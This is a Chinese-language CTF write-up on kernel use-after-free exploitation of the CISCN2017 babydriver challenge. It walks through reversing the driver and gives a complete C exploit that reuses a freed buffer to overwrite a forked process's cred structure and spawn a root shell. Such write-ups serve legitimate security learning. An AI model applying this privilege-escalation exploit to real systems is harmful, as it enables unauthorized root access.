---
title: Kernel初识 - Kernel UAF
date: '2025-08-10 19:44:39'
updated: '2025-08-10 19:48:49'
permalink: posts/16111.html
categories:
  - 知识分享
tags:
  - Kernel Pwn
---

# Kernel UAF

`UAF` 即 `Use After Free` ，通常指的是对于释放后未重置的垂悬指针利用 。此前在用户态下heap阶段的很多对于 `ptmalloc` 利用都是基于 `UAF` 漏洞进行进一步的利用 。

在 CTF 当中，内核的 "堆内存" 主要指的是直接映射区（direct mapping area），常用的分配函数 `kmalloc` 从此分配内存，常用的分配器为 `slub allocator` ，若是在 kernel 中存在垂悬指针，我们同样可以以此完成对 `slab/slub` 内存分配器的利用，通过 `Kernel UAF` 完成提权 。

# CISCN2017 - babydriver

![image-20250720142741181](/images/posts/20250810194815016.png)

题目只给了我们` boot.sh` 、`bzImage` 、`rootfs.cpio` 三个文件

观察一下  `boot.sh` 这应该是题目的启动脚本相关的：

![image-20250720142937512](/images/posts/20250810194847147.png)

脚本很正常 ，接下来我们将 `rootfs.cpio` 文件解包进一步分析 。

```
mkdir core
mv rootfs.cpio rootfs.cpio.gz
mv rootfs.cpio.gz core
gunzip rootfs.cpio.gz
cpio -idm < ./rootfs.cpio
```

![image-20250720143305801](/images/posts/20250810194811330.png)

观察一下 `init` 文件：

![image-20250720143340207](/images/posts/20250810194812449.png)

对 flag 文件赋予了root权限 ，其他命令一切正常 ，这里把 .ko 文件保存在了 /lib/modules/4.4.72/babydriver.ko 了

我们用ida打开.ko文件，对其进行一个逆向分析

![image-20250720143653730](/images/posts/20250810194813962.png)

可以看到总共有这一些函数，我们先来看 init 、exit 函数 ：

![image-20250720143743373](/images/posts/20250810194815169.png)

对 baby_dev 进行了一个初始化

![image-20250720143903897](/images/posts/20250810194817215.png)

对 baby_dev 进行了一个清理 ，这两个函数都很正常 ，没有什么大问题

接下来看 open 和 release 函数：

![image-20250720144016803](/images/posts/20250810194819198.png)

创造了一个 0x40 大小的堆块 ，将指针放置在了 babydev_struct.devicve_buf 这个全局变量里面 ，同时将babydev_struct.device_buf_len 设置为 0x40 大小 

![image-20250720144318579](/images/posts/20250810194820865.png)

release 则是对该全局变量指向的指针堆块进行一个释放 ，但是释放后没有把指针进行清空，所以存在一个 uaf 漏洞

接下来分析的是 read 以及 write 函数：

![image-20250720144428638](/images/posts/20250810194822598.png)

read 函数显示检测 len 的长度大小是否小于 babydev_struct.devicve_buf_len ，然后复制  babydev_struct.devicve_buf 里的内容到用户态的 buffer 里面去 

![image-20250720144635864](/images/posts/20250810194823961.png)

wrtie 函数是从用户态复制 buffer 到 babydev_struct.devicve_buf 里面去 ，这样可能看得不是很清楚，所以我们可以去看看汇编

![image-20250720145320892](/images/posts/20250810194826096.png)

发现调用时 rdi 是等于 babydev_struct.devicve_buf 的 ，所以我们的猜想正确

最后我们看看 ioctl 函数 

![image-20250720145853620](/images/posts/20250810194827639.png)

ioctl 函数释放掉了全局变量的堆块指针，同时申请了一个用户自定义大小的堆块，由于程序存在uaf漏洞，所以我们可以直接通过uaf漏洞纂改 struct cred 结构体 ，从而达到提权的目的，下面我直接引用**z1r0**师傅的解题思路：

这里其实就是个竞争uaf漏洞。也就是说如果我们同时打开两个设备，第二次会覆盖第一次分配的空间，因为 babydev_struct 是全局的。同样，如果释放第一个，那么第二个其实是被是释放过的，这样就造成了一个 UAF。

初始化两个，释放第一个，再给第一个ioctl到指定的地址，接下来修改第二个其实就是修改的第一个的地址内容。因为存在uaf，重启再用不会清0。

这里最关键的是buf是全局变量，两个都用的是一个buf，存在竞争。前面说到过提权的方法，可以改cred来进行root提权，这个版本是：4.4.72 ：

```
struct cred {
    atomic_t    usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
    atomic_t    subscribers;    /* number of processes subscribed */
    void        *put_addr;
    unsigned    magic;
#define CRED_MAGIC  0x43736564
#define CRED_MAGIC_DEAD 0x44656144
#endif
    kuid_t      uid;        /* real UID of the task */
    kgid_t      gid;        /* real GID of the task */
    kuid_t      suid;       /* saved UID of the task */
    kgid_t      sgid;       /* saved GID of the task */
    kuid_t      euid;       /* effective UID of the task */
    kgid_t      egid;       /* effective GID of the task */
    kuid_t      fsuid;      /* UID for VFS ops */
    kgid_t      fsgid;      /* GID for VFS ops */
    unsigned    securebits; /* SUID-less security management */
    kernel_cap_t    cap_inheritable; /* caps our children can inherit */
    kernel_cap_t    cap_permitted;  /* caps we're permitted */
    kernel_cap_t    cap_effective;  /* caps we can actually use */
    kernel_cap_t    cap_bset;   /* capability bounding set */
    kernel_cap_t    cap_ambient;    /* Ambient capability set */
#ifdef CONFIG_KEYS
    unsigned char   jit_keyring;    /* default keyring to attach requested
                     * keys to */
    struct key __rcu *session_keyring; /* keyring inherited over fork */
    struct key  *process_keyring; /* keyring private to this process */
    struct key  *thread_keyring; /* keyring private to this thread */
    struct key  *request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
    void        *security;  /* subjective LSM security */
#endif
    struct user_struct *user;   /* real user ID subscription */
    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
    struct group_info *group_info;  /* supplementary groups for euid/fsgid */
    struct rcu_head rcu;        /* RCU deletion hook */
};
```

那么根据 UAF 的思想，思路如下：

1. 打开两次设备，通过 ioctl 更改其大小为 cred 结构体的大小
2. 释放其中一个，fork 一个新进程，那么这个新进程的 cred 的空间就会和之前释放的空间重叠
3. 同时，我们可以通过另一个文件描述符对这块空间写，只需要将 uid，gid 改为 0，即可以实现提权到 root

需要确定 cred 结构体的大小，有了源码，大小就很好确定了。计算一下是 0xa8（注意使用相同内核版本的源码）。

### EXP：

```
#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
#include<fcntl.h>
#include<string.h>
#include<sys/types.h>
#include<sys/wait.h>
#include<sys/ioctl.h>
#include<pthread.h>
int main(int argc, char **argv)
{
    int fd1,fd2;
    //开启了两个设备，这两个设备共用一个babydev_struct.device_buf
    fd1 = open("/dev/babydev",O_RDWR);
    fd2 = open("/dev/babydev",O_RDWR);
    //调用ioctl在babydev_struct.device_buf申请一个struct cred大小的内存
    ioctl(fd1,65537,0xa8);
    //关掉设备fd1，但是由于存在uaf我们的fd2依然可以控制babydev_struct.device_buf
    close(fd1);
    //开启一个新的进程：
    int pid = fork();
    if(pid == 0){
        puts("\033[34m\033[1m[*] Process creation successful .\033[0m");
        char buf[28] = {0};
        write(fd2,buf,28);
        if(getuid() == 0){
            puts("\033[34m\033[1m[*] pwn!!! success ! .\033[0m");
            // 起一个root shell
            system("/bin/sh");
        }else if(pid < 0){
            puts("\033[34m\033[1m[*] There were some minor issues.  .\033[0m");
        }
    }else{
        wait(NULL);
    }

    close(fd2);
    return 0;
}
```

编译进core，重新打包启动，运行exp即可提权

![image-20250720150648147](/images/posts/20250810194830254.png)

提权成功！



























